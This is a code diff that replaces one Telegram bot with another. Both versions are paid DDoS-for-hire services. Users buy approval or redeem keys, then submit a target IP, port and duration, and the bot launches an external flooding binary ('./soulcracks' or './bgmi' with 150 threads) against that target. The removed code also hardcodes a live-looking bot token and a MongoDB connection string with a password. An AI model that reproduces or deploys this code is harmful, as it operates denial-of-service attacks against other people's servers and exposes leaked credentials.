@@ -1,292 +1,250 @@
-import os
-import telebot
+
+
+import subprocess
 import json
-import requests
-import logging
-import time
-from pymongo import MongoClient
-from datetime import datetime, timedelta
-import certifi
-import asyncio
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-from threading import Thread
-
-loop = asyncio.get_event_loop()
-
-TOKEN = '7678781870:AAEdEokUHXR7fzyULq5oY7-dNXt3tcdo6vw'
-MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
-FORWARD_CHANNEL_ID = 7017469802
-CHANNEL_ID = 7017469802
-error_channel_id = 7017469802
-
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['rishi']
-users_collection = db.users
-
-bot = telebot.TeleBot(TOKEN)
-REQUEST_INTERVAL = 1
-
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-
-running_processes = []
+import os
+import random
+import string
+import datetime
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 
 
-REMOTE_HOST = '4.213.71.147'  
-async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./soulcracks {target_ip} {target_port} {duration}"
+USER_FILE = "../users.json"
+KEY_FILE = "../keys.json"
+
+flooding_process = None
+flooding_command = None
+
+
+DEFAULT_THREADS = 150
+
+
+users = {}
+keys = {}
+
+
+def load_data():
+    global users, keys
+    users = load_users()
+    keys = load_keys()
+
+def load_users():
     try:
-       
-        process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        running_processes.append(process)
-        stdout, stderr = await process.communicate()
-        output = stdout.decode()
-        error = stderr.decode()
-
-        if output:
-            logging.info(f"Command output: {output}")
-        if error:
-            logging.error(f"Command error: {error}")
-
+        with open(USER_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
     except Exception as e:
-        logging.error(f"Failed to execute command on Codespace: {e}")
-    finally:
-        if process in running_processes:
-            running_processes.remove(process)
+        print(f"Error loading users: {e}")
+        return {}
 
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
+def save_users():
+    with open(USER_FILE, "w") as file:
+        json.dump(users, file)
 
-async def run_attack_command_async(target_ip, target_port, duration):
-    await run_attack_command_on_codespace(target_ip, target_port, duration)
-
-def is_user_admin(user_id, chat_id):
+def load_keys():
     try:
-        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
-    except:
-        return False
-
-def check_user_approval(user_id):
-    user_data = users_collection.find_one({"user_id": user_id})
-    if user_data and user_data['plan'] > 0:
-        return True
-    return False
-
-def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['approve', 'disapprove'])
-def approve_or_disapprove_user(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    is_admin = is_user_admin(user_id, CHANNEL_ID)
-    cmd_parts = message.text.split()
-
-    if not is_admin:
-        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
-        return
-
-    if len(cmd_parts) < 2:
-        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
-        return
-
-    action = cmd_parts[0]
-    target_user_id = int(cmd_parts[1])
-    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
-    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
-
-    if action == '/approve':
-        if plan == 1: 
-            if users_collection.count_documents({"plan": 1}) >= 99:
-                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
-                return
-        elif plan == 2:
-            if users_collection.count_documents({"plan": 2}) >= 499:
-                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
-                return
-
-        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
-    else:  # disapprove
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
-        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
-
-    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
-    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
-
-last_attack_time = {}
-
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    # Check if the user is approved to use the /attack command
-    if not check_user_approval(user_id):
-        send_not_approved_message(chat_id)
-        return
-
-
-    current_time = time.time()
-
-
-    if user_id in last_attack_time:
-        last_attack = last_attack_time[user_id]
-        time_diff = current_time - last_attack
-
-        if time_diff < 265.78:
-            wait_time = 265.78 - time_diff
-            bot.send_message(chat_id, f"⏳ Please wait {wait_time:.2f} seconds before initiating another attack.", parse_mode='Markdown')
-            return
-
-    bot.send_message(chat_id, "*Please provide the details for the attack in the following format:*\n* <host> <port> <time>*", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_attack_command)
-
-def process_attack_command(message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
-            return
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
-
-        # Proceed with attack command execution
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
-            return
-
-
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')
-
-
-        last_attack_time[user_id] = time.time()
-
+        with open(KEY_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
     except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
+        print(f"Error loading keys: {e}")
+        return {}
 
-def send_not_approved_message(chat_id):
-    bot.send_message(
-        chat_id, 
-        "*🚫 Unauthorized Access! 🚫*\n\n"
-        "*Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:*\n\n"
-        "👉 *Contact an Admin or the Owner for approval.*\n"
-        "🌟 *Become a proud supporter and purchase approval.*\n"
-        "💬 *Chat with an admin now and level up your capabilities!*\n\n"
-        "🚀 *Ready to supercharge your experience? Take action and get ready for powerful attacks!*", 
-        parse_mode='Markdown'
-    )
+def save_keys():
+    with open(KEY_FILE, "w") as file:
+        json.dump(keys, file)
 
+def generate_key(length=6):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
 
+def add_time_to_current_date(hours=0, days=0):
+    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
 
-def process_attack_command(message):
-    try:
-        args = message.text.split()
-        if len(args) != 3:
-            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
-            return
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
-
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, "*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
-            return
-
-        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
-
-
-        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')
-
-        bot.send_message(message.chat.id, "ATTACK SEND SUCCESSFULY! 💥🚀")
-
-    except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
-
-def start_asyncio_thread():
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(start_asyncio_loop())
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-
-  
-    # Create buttons
-    btn1 = KeyboardButton("")
-    btn2 = KeyboardButton("🚀Attack")
-    btn3 = KeyboardButton("")
-    btn4 = KeyboardButton("ℹ️ My Info")
-    btn5 = KeyboardButton("")
-    btn6 = KeyboardButton("")
-
-    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
-
-    bot.send_message(message.chat.id, "*🚀BOT READY TO ATTACK🚀*", reply_markup=markup, parse_mode='Markdown')
-
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    if message.text == "Instant Plan 🧡":
-        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
-    elif message.text == "🚀Attack":
-        bot.reply_to(message, "*🚀Attack Selected*", parse_mode='Markdown')
-        attack_command(message)
-    elif message.text == "💼ResellerShip":
-        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-*", parse_mode='Markdown')
-    elif message.text == "ℹ️ My Info":
-        user_id = message.from_user.id
-        user_data = users_collection.find_one({"user_id": user_id})
-
-
-        if user_data:
-            username = message.from_user.username
-            plan = user_data.get('plan', 'Not Approved')
-            valid_until = user_data.get('valid_until', 'Not Approved')
-            
-
-            role = 'User' if plan > 0 else 'Not Approved'
-
-
-            response = (
-                f"*👤User Info*\n"
-                f"🔖 Role: {role}\n"
-                f"🆔 User ID: {user_id}\n"
-                f"👤 Username: @{username}\n"
-                f"⏳ Approval Expiry: {valid_until if valid_until != 'Not Approved' else 'Not Approved'}"
-            )
+# Command to generate keys
+async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        command = context.args
+        if len(command) == 2:
+            try:
+                time_amount = int(command[0])
+                time_unit = command[1].lower()
+                if time_unit == 'hours':
+                    expiration_date = add_time_to_current_date(hours=time_amount)
+                elif time_unit == 'days':
+                    expiration_date = add_time_to_current_date(days=time_amount)
+                else:
+                    raise ValueError("Invalid time unit")
+                key = generate_key()
+                keys[key] = expiration_date
+                save_keys()
+                response = f"Key generated: {key}\nExpires on: {expiration_date}"
+            except ValueError:
+                response = "Please specify a valid number and unit of time (hours/days) script by @BGS_AYUSH."
         else:
-            response = "*No account information found. Please contact the administrator.*"
-        
-        bot.reply_to(message, response, parse_mode='Markdown')
-    elif message.text == "🤖STRESSER SERVER":
-        bot.reply_to(message, "*🤖STRESSER SERVER RUNNING....*", parse_mode='Markdown')
-    elif message.text == "Contact admin✔️":
-        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
+            response = "Usage: /genkey <amount> <hours/days>"
     else:
-        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
+        response = "ONLY OWNER CAN USE💀OWNER @LDX_COBRA..."
 
-if __name__ == "__main__":
-    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
-    asyncio_thread.start()
-    logging.info("SOUL SERVER RUNNING.....")
-    while True:
-        try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            logging.error(f"An error occurred while polling: {e}")
-        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
-        time.sleep(REQUEST_INTERVAL)
+    await update.message.reply_text(response)
+
+
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    command = context.args
+    if len(command) == 1:
+        key = command[0]
+        if key in keys:
+            expiration_date = keys[key]
+            if user_id in users:
+                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
+                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
+                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
+            else:
+                users[user_id] = expiration_date
+            save_users()
+            del keys[key]
+            save_keys()
+            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @RAHUL_DDOS_B"
+        else:
+            response = "Invalid or expired key buy from @RAHUL_DDOS_B"
+    else:
+        response = "Usage: /redeem <key>"
+
+    await update.message.reply_text(response)
+
+
+async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        if users:
+            response = "Authorized Users:\n"
+            for user_id, expiration_date in users.items():
+                try:
+                    user_info = await context.bot.get_chat(int(user_id))
+                    username = user_info.username if user_info.username else f"UserID: {user_id}"
+                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
+                except Exception:
+                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
+        else:
+            response = "No data found"
+    else:
+        response = "ONLY OWNER CAN USE."
+    await update.message.reply_text(response)
+
+
+async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global flooding_command
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @LDX_COBRA")
+        return
+
+    if len(context.args) != 3:
+        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
+        return
+
+    target_ip = context.args[0]
+    port = context.args[1]
+    duration = context.args[2]
+
+    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
+    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @LDX_COBRA.')
+
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global flooding_process, flooding_command
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @LDX_COBRA")
+        return
+
+    if flooding_process is not None:
+        await update.message.reply_text('❌𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐑𝐔𝐍𝐍𝐈𝐍𝐆❌.')
+        return
+
+    if flooding_command is None:
+        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
+        return
+
+    flooding_process = subprocess.Popen(flooding_command)
+    await update.message.reply_text('🚀𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫...🚀')
+
+
+async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global flooding_process
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @LDX_COBRA")
+        return
+
+    if flooding_process is None:
+        await update.message.reply_text('No flooding process is running.OWNER @LDX_COBRA...')
+        return
+
+    flooding_process.terminate()
+    flooding_process = None
+    await update.message.reply_text('𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑶𝑷𝑬𝑫...✅')
+
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        message = ' '.join(context.args)
+        if not message:
+            await update.message.reply_text('Usage: /broadcast <message>')
+            return
+
+        for user in users.keys():
+            try:
+                await context.bot.send_message(chat_id=int(user), text=message)
+            except Exception as e:
+                print(f"Error sending message to {user}: {e}")
+        response = "Message sent to all users."
+    else:
+        response = "ONLY OWNER CAN USE."
+    
+    await update.message.reply_text(response)
+
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    response = (
+        "Welcome to the Flooding Bot by @{OWNER_USERNAME}..! Here are the available commands:\n\n"
+        "Admin Commands:\n"
+        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
+        "/allusers - Show all authorized users.\n"
+        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
+        "User Commands:\n"
+        "/redeem <key> - Redeem a key to gain access.\n"
+        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
+        "/start - Start the flooding process.\n"
+        "/stop - Stop the flooding process.\n"
+    )
+    await update.message.reply_text(response)
+
+def main() -> None:
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    application.add_handler(CommandHandler("genkey", genkey))
+    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("allusers", allusers))
+    application.add_handler(CommandHandler("bgmi", bgmi))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("stop", stop))
+    application.add_handler(CommandHandler("broadcast", broadcast))
+    application.add_handler(CommandHandler("help", help_command))
+
+    load_data()
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
+#BGS_MODS
